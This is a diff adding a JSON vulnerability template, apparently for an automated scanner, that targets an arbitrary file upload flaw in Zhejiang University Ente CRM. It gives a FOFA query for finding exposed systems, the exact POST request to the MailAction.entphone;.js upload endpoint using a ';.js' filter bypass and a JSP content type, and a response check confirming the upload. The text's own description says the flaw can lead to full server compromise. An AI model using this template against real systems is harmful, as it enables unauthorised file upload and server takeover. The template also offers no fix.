@@ -1,0 +1,40 @@
+{
+  "product": "浙大恩特CRM",
+  "vul_name": "浙大恩特CRM MailAction.entphone;.js接口任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "杭州恩软信息技术有限公司（浙大恩特）提供外贸管理软件、外贸客户管理软件等外贸软件，浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源，提升销售和市场营销的效果。该系统的MailAction.entphone接口存在文件上传漏洞，恶意攻击者可通过该漏洞上传恶意脚本，最终可导致服务器失陷。",
+  "version": "",
+  "note": "查看响应包中是否回显上传路径，访问返回的文件路径，成功上传。",
+  "search": {
+    "FOFA": "app=\"浙大恩特客户资源管理系统\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/12593339/137461852",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/entsoft/MailAction.entphone;.js?act=AppUpload&bodyID=1",
+      "file": {
+        "file": [
+          "1.png",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "image/jsp"
+        ]
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "AttName"
+        }
+      ]
+    }
+  }
+}
